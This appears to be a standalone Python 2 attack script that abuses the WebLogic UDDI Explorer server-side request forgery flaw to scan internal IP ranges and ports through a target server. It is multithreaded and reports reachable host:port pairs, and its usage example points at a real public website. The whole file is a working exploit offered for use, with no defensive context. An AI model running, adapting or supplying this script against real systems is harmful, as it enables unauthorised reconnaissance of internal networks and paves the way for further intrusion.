#!/usr/bin/evn python
# -*- coding: utf-8 -*-
#Author: kzaopa

import Queue
import threading
import re
import sys
import requests
from IPy import IP

lock = threading.Lock()

def http_req(host):
    while True:
        ip_str = queue.get()
        if ip_str == 'quit':
            break

        ports = ('21','22','23','53','80','135','139','443','445','1080','1433','1521','3306','3389','4899','8080','7001','8000',)
        # ports = ('80', '445')
        for port in ports:
            exp_url = "http://%s/uddiexplorer/SearchPublicRegistries.jsp?operator=http://%s:%s&rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search"%(host, ip_str, port)
            try:
                response = requests.get(exp_url, timeout=15, verify=False)
                #SSRF判断
                re_sult1 = re.findall('weblogic.uddi.client.structures.exception.XML_SoapException',response.content)
                #丢失连接.端口连接不上
                re_sult2 = re.findall('but could not connect',response.content)
                if len(re_sult1)!=0 and len(re_sult2)==0:
                    lock.acquire()
                    print '{0}:{1}_connect_success'.format(ip_str, port)
                    lock.release()
            except Exception, e:
                pass


if __name__ == '__main__':
    queue = Queue.Queue()
    threads = []

    try:
        ip_mask = sys.argv[1]
    except:
        print 'Usage: python script.py ip_mask ip/domain threads(Options)'
        print 'python script.py 192.168.0.0/16 www.baidu.com 17'
        sys.exit(0)

    try:
        host = sys.argv[2]
    except:
        print 'Usage: python script.py ip_mask ip/domain threads(Options)'
        print 'python script.py 192.168.0.0/16 www.baidu.com 17'
        sys.exit(0)

    try:
        m = int(sys.argv[3])
    except:
        m = 10
        # sys.exit(0)
    ips = IP(ip_mask)
    for ipn in ips:
        if ipn:
            # ip_str = ip_str.strip()
            queue.put(ipn)

    for m in range(m):
        t = threading.Thread(target=http_req, args=(host,))
        threads.append(t)
        t.start()

    for q in threads:
        queue.put('quit')

    for t in threads:
        t.join()